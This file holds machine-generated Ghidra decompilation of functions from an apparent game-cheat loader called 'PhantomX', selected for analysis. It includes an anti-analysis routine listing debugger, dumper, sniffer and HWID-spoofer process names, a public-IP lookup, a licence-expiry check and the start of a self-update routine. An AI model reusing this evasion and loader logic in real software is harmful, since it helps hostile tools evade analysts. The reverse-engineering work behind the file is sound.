/* key_loader_functions.c
 *
 * Extracted from C:\temp\loader_decompiled.c (Ghidra 12.2 headless decompilation of
 * the memory-reconstructed PhantomX loader, image base 0x160000).
 * Selection: every decompiled function whose body contains behavior markers
 * (C2 endpoints, mutex, self-update, game targeting, injection APIs, HWID logic...).
 * Machine-generated; Ghidra variable names are preserved as-is.
 */

/*
 * FUNCTION FUN_00164120 @ 0x00164120  (VA = 0x160000 + RVA 0x4120)
 * MARKERS:
 *   - ImGui window/menu strings
 */

// ==== FUN_00164120 @ 00164120 (interesting=no) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined4 __fastcall FUN_00164120(undefined4 param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  short sVar4;
  int iVar5;
  undefined4 *puVar6;
  uint uVar7;
  undefined4 uVar8;
  int *piVar9;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  iVar3 = DAT_00360310;
  local_8 = DAT_00242400 ^ (int)register0x00000010 - 4U;
  iVar5 = func_0x00682df2(&local_10,&local_10);
  if (iVar5 != 0) {
    iVar5 = FUN_0196a33e(&local_18,&local_18);
    if (iVar5 != 0) {
      puVar6 = (undefined4 *)(*DAT_0021f590)(0x40);
      iVar5 = DAT_00360310;
      if (DAT_00360310 != 0) {
        piVar1 = (int *)(DAT_00360310 + 4);
        piVar9 = (int *)(DAT_00360310 + 0x26b4 + *(short *)(DAT_00360310 + 0x26b0) * 8);
        if (*piVar9 != *piVar1) {
          iVar2 = DAT_00360310 + 0x26b4;
          sVar4 = (short)((*(short *)(DAT_00360310 + 0x26b0) + 1) % 6);
          *(short *)(DAT_00360310 + 0x26b0) = sVar4;
          piVar9 = (int *)(iVar2 + sVar4 * 8);
          *piVar9 = *piVar1;
          piVar9[1] = 0;
        }
        *(short *)(piVar9 + 1) = (short)piVar9[1] + 1;
        *(int *)(iVar5 + 0x26a8) = *(int *)(iVar5 + 0x26a8) + 1;
      }
      if (puVar6 == (undefined4 *)0x0) {
        puVar6 = (undefined4 *)0x0;
      }
      else {
        FUN_0021b2ce(puVar6,0,0x40);
      }
      *(uint *)(iVar3 + 0x2c) = *(uint *)(iVar3 + 0x2c) | 6;
      *(undefined4 **)(iVar3 + 0x9c) = puVar6;
      *(char **)(iVar3 + 0x94) = "imgui_impl_win32";
      *puVar6 = param_1;
      puVar6[6] = local_10;
      puVar6[7] = local_c;
      puVar6[4] = local_18;
      puVar6[5] = local_14;
      puVar6[8] = 0xb;
      iVar3 = *(int *)(iVar3 + 0x9c);
      uVar7 = FUN_0064c9d6(local_18,0);
      uVar8 = FUN_004ce552(uVar7 >> 0x10,0x20001004,iVar3 + 0x24,4);
      return uVar8;
    }
  }
  return 0;
}

/*
 * FUNCTION FUN_00166bf0 @ 0x00166bf0  (VA = 0x160000 + RVA 0x6bf0)
 * MARKERS:
 *   - ImGui window/menu strings
 */

// ==== FUN_00166bf0 @ 00166bf0 (interesting=no) ====

undefined4 * __fastcall FUN_00166bf0(undefined4 *param_1)

{
  undefined4 *puVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = 5;
  param_1[0x27] = 0;
  param_1[0x28] = 0;
  puVar1 = param_1 + 0x2a2;
  do {
    *puVar1 = 0;
    puVar1[1] = 0;
    iVar2 = iVar2 + -1;
    puVar1 = puVar1 + 2;
  } while (iVar2 != 0);
  param_1[0x2df] = 0;
  param_1[0x2de] = 0;
  param_1[0x2e0] = 0;
  FUN_0021b2ce(param_1,0,0xb98);
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0xbf800000;
  param_1[3] = 0xbf800000;
  param_1[6] = 0x3c888889;
  param_1[7] = 0x40a00000;
  param_1[8] = "imgui.ini";
  param_1[9] = "imgui_log.txt";
  param_1[10] = 0;
  param_1[0xb] = 0;
  param_1[0xc] = 0;
  param_1[0xd] = 0x1000000;
  param_1[0x2e1] = 0x3f800000;
  param_1[4] = 0x3f800000;
  param_1[5] = 0x3f800000;
  param_1[0xe] = 0x10001;
  param_1[0xf] = &DAT_01010000;
  param_1[0x10] = 0x10000;
  *(undefined2 *)(param_1 + 0x11) = 0x100;
  param_1[0x12] = 0x42700000;
  param_1[0x19] = 0x10100;
  *(undefined1 *)(param_1 + 0x1a) = 0;
  param_1[0x18] = &DAT_01010101;
  param_1[0x13] = 0x3e99999a;
  param_1[0x14] = 0x40c00000;
  param_1[0x15] = 0x40c00000;
  param_1[0x16] = 0x3e8ccccd;
  param_1[0x17] = 0x3d4ccccd;
  param_1[0x1c] = 0;
  param_1[0x1b] = 0;
  param_1[0x1f] = 0;
  param_1[0x1e] = 0;
  param_1[0x1d] = 0;
  param_1[0x2a] = 0xff7fffff;
  param_1[0x2b] = 0xff7fffff;
  param_1[0x2a0] = 0xff7fffff;
  param_1[0x2a1] = 0xff7fffff;
  param_1[0x30] = 0;
  param_1[0x2d2] = 0xbf800000;
  param_1[0x2cd] = 0xbf800000;
  param_1[0x2d3] = 0xbf800000;
  param_1[0x2ce] = 0xbf800000;
  param_1[0x2d4] = 0xbf800000;
  param_1[0x2cf] = 0xbf800000;
  param_1[0x2d5] = 0xbf800000;
  param_1[0x2d0] = 0xbf800000;
  param_1[0x2d6] = 0xbf800000;
  param_1[0x2d1] = 0xbf800000;
  iVar2 = 0;
  do {
    iVar3 = iVar2 + 1;
    param_1[iVar2 * 4 + 0x35] = 0xbf800000;
    param_1[iVar2 * 4 + 0x34] = 0xbf800000;
    iVar2 = iVar3;
  } while (iVar3 < 0x9b);
  *(undefined1 *)((int)param_1 + 0xb75) = 1;
  return param_1;
}

/*
 * FUNCTION FUN_001b45a0 @ 0x001b45a0  (VA = 0x160000 + RVA 0x545a0)
 * MARKERS:
 *   - HWID spoofer/changer detection
 *   - Anti-analysis processes scan
 */

// ==== FUN_001b45a0 @ 001b45a0 (interesting=no) ====

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __fastcall FUN_001b45a0(undefined4 param_1)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 *puVar2;
  undefined4 local_64c;
  undefined4 uStack_648;
  undefined4 uStack_644;
  undefined4 uStack_640;
  undefined4 local_63c;
  undefined4 local_638;
  undefined4 local_634;
  undefined4 uStack_630;
  undefined4 uStack_62c;
  undefined4 uStack_628;
  undefined4 local_624;
  undefined4 local_620;
  undefined4 local_61c;
  undefined4 uStack_618;
  undefined4 uStack_614;
  undefined4 uStack_610;
  undefined4 local_60c;
  undefined4 local_608;
  undefined4 local_604;
  undefined4 uStack_600;
  undefined4 uStack_5fc;
  undefined4 uStack_5f8;
  undefined4 local_5f4;
  undefined4 local_5f0;
  undefined4 local_5ec;
  undefined4 uStack_5e8;
  undefined4 uStack_5e4;
  undefined4 uStack_5e0;
  undefined4 local_5dc;
  undefined4 local_5d8;
  undefined4 local_5d4;
  undefined4 uStack_5d0;
  undefined4 uStack_5cc;
  undefined4 uStack_5c8;
  undefined4 local_5c4;
  undefined4 local_5c0;
  undefined4 local_5bc;
  undefined4 uStack_5b8;
  undefined4 uStack_5b4;
  undefined4 uStack_5b0;
  undefined4 local_5ac;
  undefined4 local_5a8;
  undefined4 local_5a4;
  undefined4 uStack_5a0;
  undefined4 uStack_59c;
  undefined4 uStack_598;
  undefined4 local_594;
  undefined4 local_590;
  undefined4 local_58c;
  undefined4 uStack_588;
  undefined4 uStack_584;
  undefined4 uStack_580;
  undefined4 local_57c;
  undefined4 local_578;
  undefined4 local_574;
  undefined4 uStack_570;
  undefined4 uStack_56c;
  undefined4 uStack_568;
  undefined4 local_564;
  undefined4 local_560;
  undefined4 local_55c;
  undefined4 uStack_558;
  undefined4 uStack_554;
  undefined4 uStack_550;
  undefined4 local_54c;
  undefined4 local_548;
  undefined4 local_544;
  undefined4 uStack_540;
  undefined4 uStack_53c;
  undefined4 uStack_538;
  undefined4 local_534;
  undefined4 local_530;
  undefined4 local_52c;
  undefined4 uStack_528;
  undefined4 uStack_524;
  undefined4 uStack_520;
  undefined4 local_51c;
  undefined4 local_518;
  undefined4 local_514;
  undefined4 uStack_510;
  undefined4 uStack_50c;
  undefined4 uStack_508;
  undefined4 local_504;
  undefined4 local_500;
  undefined4 local_4fc;
  undefined4 uStack_4f8;
  undefined4 uStack_4f4;
  undefined4 uStack_4f0;
  undefined4 local_4ec;
  undefined4 local_4e8;
  undefined4 local_4e4;
  undefined4 uStack_4e0;
  undefined4 uStack_4dc;
  undefined4 uStack_4d8;
  undefined4 local_4d4;
  undefined4 local_4d0;
  undefined4 local_4cc;
  undefined4 uStack_4c8;
  undefined4 uStack_4c4;
  undefined4 uStack_4c0;
  undefined4 local_4bc;
  undefined4 local_4b8;
  undefined4 local_4b4;
  undefined4 uStack_4b0;
  undefined4 uStack_4ac;
  undefined4 uStack_4a8;
  undefined4 local_4a4;
  undefined4 local_4a0;
  undefined4 local_49c;
  undefined4 uStack_498;
  undefined4 uStack_494;
  undefined4 uStack_490;
  undefined4 local_48c;
  undefined4 local_488;
  undefined4 local_484;
  undefined4 uStack_480;
  undefined4 uStack_47c;
  undefined4 uStack_478;
  undefined4 local_474;
  undefined4 local_470;
  undefined4 local_46c;
  undefined4 uStack_468;
  undefined4 uStack_464;
  undefined4 uStack_460;
  undefined4 local_45c;
  undefined4 local_458;
  undefined4 local_454;
  undefined4 uStack_450;
  undefined4 uStack_44c;
  undefined4 uStack_448;
  undefined4 local_444;
  undefined4 local_440;
  undefined4 local_43c;
  undefined4 uStack_438;
  undefined4 uStack_434;
  undefined4 uStack_430;
  undefined4 local_42c;
  undefined4 local_428;
  undefined4 local_424;
  undefined4 uStack_420;
  undefined4 uStack_41c;
  undefined4 uStack_418;
  undefined4 local_414;
  undefined4 local_410;
  undefined4 local_40c;
  undefined4 uStack_408;
  undefined4 uStack_404;
  undefined4 uStack_400;
  undefined4 local_3fc;
  undefined4 local_3f8;
  undefined4 local_3f4;
  undefined4 uStack_3f0;
  undefined4 uStack_3ec;
  undefined4 uStack_3e8;
  undefined4 local_3e4;
  undefined4 local_3e0;
  undefined4 local_3dc;
  undefined4 uStack_3d8;
  undefined4 uStack_3d4;
  undefined4 uStack_3d0;
  undefined4 local_3cc;
  undefined4 local_3c8;
  undefined4 local_3c4;
  undefined4 uStack_3c0;
  undefined4 uStack_3bc;
  undefined4 uStack_3b8;
  undefined4 local_3b4;
  undefined4 local_3b0;
  undefined4 local_3ac;
  undefined4 uStack_3a8;
  undefined4 uStack_3a4;
  undefined4 uStack_3a0;
  undefined4 local_39c;
  undefined4 local_398;
  undefined4 local_394;
  undefined4 uStack_390;
  undefined4 uStack_38c;
  undefined4 uStack_388;
  undefined4 local_384;
  undefined4 local_380;
  undefined4 local_37c;
  undefined4 uStack_378;
  undefined4 uStack_374;
  undefined4 uStack_370;
  undefined4 local_36c;
  undefined4 local_368;
  undefined4 local_364;
  undefined4 uStack_360;
  undefined4 uStack_35c;
  undefined4 uStack_358;
  undefined4 local_354;
  undefined4 local_350;
  undefined4 local_34c;
  undefined4 uStack_348;
  undefined4 uStack_344;
  undefined4 uStack_340;
  undefined4 local_33c;
  undefined4 local_338;
  undefined4 local_334;
  undefined4 uStack_330;
  undefined4 uStack_32c;
  undefined4 uStack_328;
  undefined4 local_324;
  undefined4 local_320;
  undefined4 local_31c;
  undefined4 uStack_318;
  undefined4 uStack_314;
  undefined4 uStack_310;
  undefined4 local_30c;
  undefined4 local_308;
  undefined4 local_304;
  undefined4 uStack_300;
  undefined4 uStack_2fc;
  undefined4 uStack_2f8;
  undefined4 local_2f4;
  undefined4 local_2f0;
  undefined4 local_2ec;
  undefined4 uStack_2e8;
  undefined4 uStack_2e4;
  undefined4 uStack_2e0;
  undefined4 local_2dc;
  undefined4 local_2d8;
  undefined4 local_2d4;
  undefined4 uStack_2d0;
  undefined4 uStack_2cc;
  undefined4 uStack_2c8;
  undefined4 local_2c4;
  undefined4 local_2c0;
  undefined4 local_2bc;
  undefined4 uStack_2b8;
  undefined4 uStack_2b4;
  undefined4 uStack_2b0;
  undefined4 local_2ac;
  undefined4 local_2a8;
  undefined4 local_2a4;
  undefined4 uStack_2a0;
  undefined4 uStack_29c;
  undefined4 uStack_298;
  undefined4 local_294;
  undefined4 local_290;
  undefined4 local_28c [6];
  undefined4 local_274;
  undefined4 *local_270;
  int local_38;
  int iStack_34;
  undefined4 *local_30;
  uint local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0021c59f;
  local_10 = ExceptionList;
  local_14 = DAT_00242400 ^ (int)register0x00000010 - 4U;
  ExceptionList = &local_10;
  local_274 = param_1;
  if (*(int *)(*(int *)ThreadLocalStoragePointer + 4) < DAT_00360874) {
    FUN_002178a0(&DAT_00360874,local_14);
    if (DAT_00360874 == -1) {
      local_8 = 0;
      DAT_003607e0 = 0;
      _DAT_003607d8 = 0;
      local_64c = 0;
      uStack_648 = 0;
      uStack_644 = 0;
      uStack_640 = 0;
      local_63c = 0;
      local_638 = 0;
      FUN_001b5250(L"ida.exe",7);
      local_8._0_1_ = 1;
      local_624 = 0;
      local_634 = 0;
      uStack_630 = 0;
      uStack_62c = 0;
      uStack_628 = 0;
      local_620 = 0;
      FUN_001b5250(L"ida64.exe",9);
      local_8._0_1_ = 2;
      local_60c = 0;
      local_61c = 0;
      uStack_618 = 0;
      uStack_614 = 0;
      uStack_610 = 0;
      local_608 = 0;
      FUN_001b5250(L"scylla.exe",10);
      local_8._0_1_ = 3;
      local_5f4 = 0;
      local_604 = 0;
      uStack_600 = 0;
      uStack_5fc = 0;
      uStack_5f8 = 0;
      local_5f0 = 0;
      FUN_001b5250(L"scylla_x64.exe",0xe);
      local_8._0_1_ = 4;
      local_5dc = 0;
      local_5ec = 0;
      uStack_5e8 = 0;
      uStack_5e4 = 0;
      uStack_5e0 = 0;
      local_5d8 = 0;
      FUN_001b5250(L"scylla_x86.exe",0xe);
      local_8._0_1_ = 5;
      local_5c4 = 0;
      local_5d4 = 0;
      uStack_5d0 = 0;
      uStack_5cc = 0;
      uStack_5c8 = 0;
      local_5c0 = 0;
      FUN_001b5250(L"x64dbg.exe",10);
      local_8._0_1_ = 6;
      local_5ac = 0;
      local_5bc = 0;
      uStack_5b8 = 0;
      uStack_5b4 = 0;
      uStack_5b0 = 0;
      local_5a8 = 0;
      FUN_001b5250(L"x32dbg.exe",10);
      local_8._0_1_ = 7;
      local_594 = 0;
      local_5a4 = 0;
      uStack_5a0 = 0;
      uStack_59c = 0;
      uStack_598 = 0;
      local_590 = 0;
      FUN_001b5250(L"ollydbg.exe",0xb);
      local_8._0_1_ = 8;
      local_57c = 0;
      local_58c = 0;
      uStack_588 = 0;
      uStack_584 = 0;
      uStack_580 = 0;
      local_578 = 0;
      FUN_001b5250(L"windbg.exe",10);
      local_8._0_1_ = 9;
      local_564 = 0;
      local_574 = 0;
      uStack_570 = 0;
      uStack_56c = 0;
      uStack_568 = 0;
      local_560 = 0;
      FUN_001b5250(L"cheatengine-x86_64.exe",0x16);
      local_8._0_1_ = 10;
      local_54c = 0;
      local_55c = 0;
      uStack_558 = 0;
      uStack_554 = 0;
      uStack_550 = 0;
      local_548 = 0;
      FUN_001b5250(L"cheatengine.exe",0xf);
      local_8._0_1_ = 0xb;
      local_534 = 0;
      local_544 = 0;
      uStack_540 = 0;
      uStack_53c = 0;
      uStack_538 = 0;
      local_530 = 0;
      FUN_001b5250(L"cheat_engine.exe",0x10);
      local_8._0_1_ = 0xc;
      local_51c = 0;
      local_52c = 0;
      uStack_528 = 0;
      uStack_524 = 0;
      uStack_520 = 0;
      local_518 = 0;
      FUN_001b5250(L"processhacker.exe",0x11);
      local_8._0_1_ = 0xd;
      local_504 = 0;
      local_514 = 0;
      uStack_510 = 0;
      uStack_50c = 0;
      uStack_508 = 0;
      local_500 = 0;
      FUN_001b5250(L"systeminformer.exe",0x12);
      local_8._0_1_ = 0xe;
      local_4ec = 0;
      local_4fc = 0;
      uStack_4f8 = 0;
      uStack_4f4 = 0;
      uStack_4f0 = 0;
      local_4e8 = 0;
      FUN_001b5250(L"procexp.exe",0xb);
      local_8._0_1_ = 0xf;
      local_4d4 = 0;
      local_4e4 = 0;
      uStack_4e0 = 0;
      uStack_4dc = 0;
      uStack_4d8 = 0;
      local_4d0 = 0;
      FUN_001b5250(L"dnspy.exe",9);
      local_8._0_1_ = 0x10;
      local_4bc = 0;
      local_4cc = 0;
      uStack_4c8 = 0;
      uStack_4c4 = 0;
      uStack_4c0 = 0;
      local_4b8 = 0;
      FUN_001b5250(L"dnspy-x86.exe",0xd);
      local_8._0_1_ = 0x11;
      local_4a4 = 0;
      local_4b4 = 0;
      uStack_4b0 = 0;
      uStack_4ac = 0;
      uStack_4a8 = 0;
      local_4a0 = 0;
      FUN_001b5250(L"ilspy.exe",9);
      local_8._0_1_ = 0x12;
      local_48c = 0;
      local_49c = 0;
      uStack_498 = 0;
      uStack_494 = 0;
      uStack_490 = 0;
      local_488 = 0;
      FUN_001b5250(L"de4dot.exe",10);
      local_8._0_1_ = 0x13;
      local_474 = 0;
      local_484 = 0;
      uStack_480 = 0;
      uStack_47c = 0;
      uStack_478 = 0;
      local_470 = 0;
      FUN_001b5250(L"httpdebugger.exe",0x10);
      local_8._0_1_ = 0x14;
      local_45c = 0;
      local_46c = 0;
      uStack_468 = 0;
      uStack_464 = 0;
      uStack_460 = 0;
      local_458 = 0;
      FUN_001b5250(L"httpdebuggerpro.exe",0x13);
      local_8._0_1_ = 0x15;
      local_444 = 0;
      local_454 = 0;
      uStack_450 = 0;
      uStack_44c = 0;
      uStack_448 = 0;
      local_440 = 0;
      FUN_001b5250(L"wireshark.exe",0xd);
      local_8._0_1_ = 0x16;
      local_42c = 0;
      local_43c = 0;
      uStack_438 = 0;
      uStack_434 = 0;
      uStack_430 = 0;
      local_428 = 0;
      FUN_001b5250(L"ksdumper.exe",0xc);
      local_8._0_1_ = 0x17;
      local_414 = 0;
      local_424 = 0;
      uStack_420 = 0;
      uStack_41c = 0;
      uStack_418 = 0;
      local_410 = 0;
      FUN_001b5250(L"ksdumper64.exe",0xe);
      local_8._0_1_ = 0x18;
      local_3fc = 0;
      local_40c = 0;
      uStack_408 = 0;
      uStack_404 = 0;
      uStack_400 = 0;
      local_3f8 = 0;
      FUN_001b5250(L"apimonitor.exe",0xe);
      local_8._0_1_ = 0x19;
      local_3e4 = 0;
      local_3f4 = 0;
      uStack_3f0 = 0;
      uStack_3ec = 0;
      uStack_3e8 = 0;
      local_3e0 = 0;
      FUN_001b5250(L"apimonitor64.exe",0x10);
      local_8._0_1_ = 0x1a;
      local_3cc = 0;
      local_3dc = 0;
      uStack_3d8 = 0;
      uStack_3d4 = 0;
      uStack_3d0 = 0;
      local_3c8 = 0;
      FUN_001b5250(L"die.exe",7);
      local_8._0_1_ = 0x1b;
      local_3b4 = 0;
      local_3c4 = 0;
      uStack_3c0 = 0;
      uStack_3bc = 0;
      uStack_3b8 = 0;
      local_3b0 = 0;
      FUN_001b5250(L"detectiteasy.exe",0x10);
      local_8._0_1_ = 0x1c;
      local_39c = 0;
      local_3ac = 0;
      uStack_3a8 = 0;
      uStack_3a4 = 0;
      uStack_3a0 = 0;
      local_398 = 0;
      FUN_001b5250(L"peid.exe",8);
      local_8._0_1_ = 0x1d;
      local_384 = 0;
      local_394 = 0;
      uStack_390 = 0;
      uStack_38c = 0;
      uStack_388 = 0;
      local_380 = 0;
      FUN_001b5250(L"cffexplorer.exe",0xf);
      local_8._0_1_ = 0x1e;
      local_36c = 0;
      local_37c = 0;
      uStack_378 = 0;
      uStack_374 = 0;
      uStack_370 = 0;
      local_368 = 0;
      FUN_001b5250(L"hwidspoofer.exe",0xf);
      local_8._0_1_ = 0x1f;
      local_354 = 0;
      local_364 = 0;
      uStack_360 = 0;
      uStack_35c = 0;
      uStack_358 = 0;
      local_350 = 0;
      FUN_001b5250(L"spoofer.exe",0xb);
      local_8._0_1_ = 0x20;
      local_33c = 0;
      local_338 = 0;
      local_34c = 0;
      uStack_348 = 0;
      uStack_344 = 0;
      uStack_340 = 0;
      FUN_001b5250(L"hwid_changer.exe",0x10);
      local_8._0_1_ = 0x21;
      local_324 = 0;
      local_334 = 0;
      uStack_330 = 0;
      uStack_32c = 0;
      uStack_328 = 0;
      local_320 = 0;
      FUN_001b5250(L"amidewin.exe",0xc);
      local_8._0_1_ = 0x22;
      local_30c = 0;
      local_31c = 0;
      uStack_318 = 0;
      uStack_314 = 0;
      uStack_310 = 0;
      local_308 = 0;
      FUN_001b5250(L"amidewin64.exe",0xe);
      local_8._0_1_ = 0x23;
      local_2f4 = 0;
      local_304 = 0;
      uStack_300 = 0;
      uStack_2fc = 0;
      uStack_2f8 = 0;
      local_2f0 = 0;
      FUN_001b5250(L"fiddler.exe",0xb);
      local_8._0_1_ = 0x24;
      local_2dc = 0;
      local_2ec = 0;
      uStack_2e8 = 0;
      uStack_2e4 = 0;
      uStack_2e0 = 0;
      local_2d8 = 0;
      FUN_001b5250(L"charles.exe",0xb);
      local_8._0_1_ = 0x25;
      local_2c4 = 0;
      local_2d4 = 0;
      uStack_2d0 = 0;
      uStack_2cc = 0;
      uStack_2c8 = 0;
      local_2c0 = 0;
      FUN_001b5250(L"megadumper.exe",0xe);
      local_8._0_1_ = 0x26;
      local_2ac = 0;
      local_2bc = 0;
      uStack_2b8 = 0;
      uStack_2b4 = 0;
      uStack_2b0 = 0;
      local_2a8 = 0;
      FUN_001b5250(L"eedump.exe",10);
      local_8._0_1_ = 0x27;
      local_294 = 0;
      local_2a4 = 0;
      uStack_2a0 = 0;
      uStack_29c = 0;
      uStack_298 = 0;
      local_290 = 0;
      FUN_001b5250(L"processhacker2.exe",0x12);
      local_8._0_1_ = 0x28;
      _DAT_003607d8 = 0;
      DAT_003607e0 = 0;
      iVar1 = FUN_00217dd0(0x3c0);
      local_270 = &DAT_003607d8;
      _DAT_003607d8 = CONCAT44(iVar1,iVar1);
      DAT_003607e0 = iVar1 + 0x3c0;
      puVar2 = &local_64c;
      _local_38 = CONCAT44(iVar1,iVar1);
      local_30 = &DAT_003607d8;
      local_8._0_1_ = 0x2a;
      do {
        FUN_001b0f20(puVar2);
        iVar1 = iVar1 + 0x18;
        puVar2 = puVar2 + 6;
        _local_38 = CONCAT44(iVar1,local_38);
      } while (puVar2 != local_28c);
      FUN_001b5360(extraout_ECX);
      _DAT_003607d8 = CONCAT44(iVar1,DAT_003607d8);
      local_8 = (uint)local_8._1_3_ << 8;
      FUN_00217950(&local_64c,0x18,0x28,FUN_001afdd0);
      FUN_00217d80(&LAB_0021e300);
      local_8 = 0xffffffff;
      FUN_00217840(&DAT_00360874);
    }
  }
  FUN_0199af1a(2,0);
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}

/*
 * FUNCTION FUN_001b6c50 @ 0x001b6c50  (VA = 0x160000 + RVA 0x56c50)
 * MARKERS:
 *   - Discord invite open
 */

// ==== FUN_001b6c50 @ 001b6c50 (interesting=no) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */
/* WARNING: Removing unreachable block (ram,0x001b6c78) */

void FUN_001b6c50(void)

{
  char cVar1;
  char *pcVar2;
  int iVar3;
  int iVar4;
  longlong lVar5;
  undefined8 uVar6;
  undefined8 uVar7;
  longlong lVar8;
  undefined4 uVar9;
  char acStack_54 [72];
  uint local_c;
  
  local_c = DAT_00242400 ^ (uint)acStack_54;
  uVar9 = 0;
  lVar5 = FUN_019067f4();
  if (0x6b0e0dff < lVar5) {
    pcVar2 = SimpleString::operator=((SimpleString *)s_19d_10h_11m_12s_0035fd44,"EXPIRED");
    FUN_005385b6(pcVar2,0,&DAT_00239250,"SYSTEM SECURITY & STABILITY ADVISORY",0x40030,uVar9);
    FUN_0194527f(0,&DAT_00239478,"https://discord.gg/aueG7RccD",0,0,1);
    lVar5 = FUN_0053b8d4();
  }
  iVar3 = 0x6b0e0e00 - (uint)lVar5;
  iVar4 = -(uint)(0x6b0e0e00 < (uint)lVar5) - (int)((ulonglong)lVar5 >> 0x20);
  uVar6 = __alldiv(iVar3,iVar4,0x15180,0);
  lVar5 = __allmul(uVar6,0xfffeae80,0xffffffff);
  lVar5 = lVar5 + CONCAT44(iVar4,iVar3);
  uVar7 = __alldiv(lVar5,0xe10,0);
  lVar8 = __allmul(uVar7,0xfffff1f0,0xffffffff);
  lVar5 = lVar5 + lVar8;
  iVar3 = __alldiv(lVar5,0x3c,0);
  FUN_001c7c20(acStack_54,"%dd %02dh %02dm %02ds",(int)uVar6,(int)uVar7,iVar3,
               (int)lVar5 + iVar3 * -0x3c);
  pcVar2 = acStack_54;
  do {
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  FUN_001b30c0(acStack_54,(int)pcVar2 - (int)(acStack_54 + 1));
  return;
}

/*
 * FUNCTION FUN_001b7770 @ 0x001b7770  (VA = 0x160000 + RVA 0x57770)
 * MARKERS:
 *   - Public-IP lookup
 */

// ==== FUN_001b7770 @ 001b7770 (interesting=no) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined4 * __fastcall FUN_001b7770(undefined4 *param_1)

{
  char cVar1;
  undefined8 *puVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  char *pcVar6;
  undefined4 *puVar7;
  int unaff_EBX;
  undefined8 *puVar8;
  undefined2 in_DS;
  undefined4 uVar9;
  undefined2 uVar11;
  code *pcVar10;
  uint local_68 [2];
  undefined8 local_60;
  undefined8 *local_58;
  char local_54 [64];
  uint local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  pcVar10 = (code *)(local_54 + 0x50);
  local_8 = 0xffffffff;
  puStack_c = &DAT_0021c909;
  local_10 = ExceptionList;
  uVar3 = DAT_00242400 ^ (uint)(local_54 + 0x50);
  ExceptionList = &local_10;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  local_14 = uVar3;
  FUN_001b1ed0("UNKNOWN-IP",10);
  local_8 = 0;
  local_60 = 0;
  local_58 = (undefined8 *)0x0;
  local_60._0_4_ = (undefined8 *)FUN_00217dd0(0xc,uVar3);
  local_58 = (undefined8 *)((int)(undefined8 *)local_60 + 0xc);
  *(undefined8 *)local_60 = 0x23952c00239514;
  *(char **)((undefined8 *)local_60 + 1) = "https://ipinfo.io/ip";
  local_8 = 1;
  local_60._4_4_ = local_58;
  iVar4 = FUN_006ecfae(local_54 + 0x50,"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",1,0,0,0);
  if (iVar4 == 0) {
LAB_001b7972:
    FUN_001c8f50(pcVar10);
    ExceptionList = local_10;
    return param_1;
  }
  FUN_018cfbe3();
  uVar9 = 0;
  local_68[1] = 0x9c4;
  (*pcVar10)(iVar4,2,local_68 + 1,4);
  (*pcVar10)(iVar4,6,local_68 + 1,4);
  puVar2 = local_60._4_4_;
  puVar8 = (undefined8 *)local_60;
  do {
    uVar11 = (undefined2)((uint)uVar9 >> 0x10);
    if (puVar8 == puVar2) goto LAB_001b796b;
    FUN_00677ab4(iVar4,*(undefined4 *)puVar8,0,0,0x84800000,0);
    unaff_EBX = CONCAT31((int3)((uint)unaff_EBX >> 8),0x8b);
    if (iVar4 != 0) {
      FUN_0021b2ce(local_54,0,0x40);
      local_68[0] = 0;
      iVar5 = FUN_006ced69(iVar4,local_54,0x3f,local_68);
      uVar11 = (undefined2)((uint)uVar9 >> 0x10);
      unaff_EBX = unaff_EBX + -1;
      if ((iVar5 != 0) && (local_68[0] != 0)) {
        if (0x3f < local_68[0]) {
                    /* WARNING: Subroutine does not return */
          FUN_00217930();
        }
        pcVar6 = local_54;
        local_54[local_68[0]] = '\0';
        do {
          cVar1 = *pcVar6;
          pcVar6 = pcVar6 + 1;
        } while (cVar1 != '\0');
        FUN_001b30c0(local_54,(int)pcVar6 - (int)(local_54 + 1));
        puVar7 = param_1;
        if (0xf < (uint)param_1[5]) {
          puVar7 = (undefined4 *)*param_1;
        }
        iVar5 = FUN_001c8d50(puVar7,&DAT_00239588,4);
        uVar3 = iVar5 + 1;
        if ((uint)param_1[4] < uVar3) {
                    /* WARNING: Subroutine does not return */
          FUN_001b34f0();
        }
        param_1[4] = uVar3;
        puVar7 = param_1;
        if (0xf < (uint)param_1[5]) {
          puVar7 = (undefined4 *)*param_1;
        }
        *(undefined1 *)((int)puVar7 + uVar3) = 0;
        FUN_019868e3(unaff_EBX,iVar4);
LAB_001b796b:
        FUN_0192b208(iVar4);
        pcVar10 = (code *)CONCAT22(uVar11,in_DS);
        goto LAB_001b7972;
      }
      FUN_01a14dcf(unaff_EBX,iVar4);
    }
    puVar8 = (undefined8 *)((int)puVar8 + 4);
  } while( true );
}

/*
 * FUNCTION FUN_001b8be0 @ 0x001b8be0  (VA = 0x160000 + RVA 0x58be0)
 * MARKERS:
 *   - Self-update phantomx_update_temp.exe
 */

// ==== FUN_001b8be0 @ 001b8be0 (interesting=yes) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined1 FUN_001b8be0(void)

{
  code *pcVar1;
  char cVar2;
  undefined1 uVar3;
  undefined1 uVar4;
  undefined4 ****ppppuVar5;
  char *pcVar6;
  uint uVar7;
  int iVar8;
  undefined4 ****local_150;
  undefined4 uStack_14c;
  undefined4 uStack_148;
  undefined4 uStack_144;
  int local_140;
  uint uStack_13c;
  undefined4 local_138;
  undefined4 local_134;
  undefined4 ****local_130;
  undefined4 ***pppuStack_12c;
  undefined4 ***pppuStack_128;
  undefined4 ***pppuStack_124;
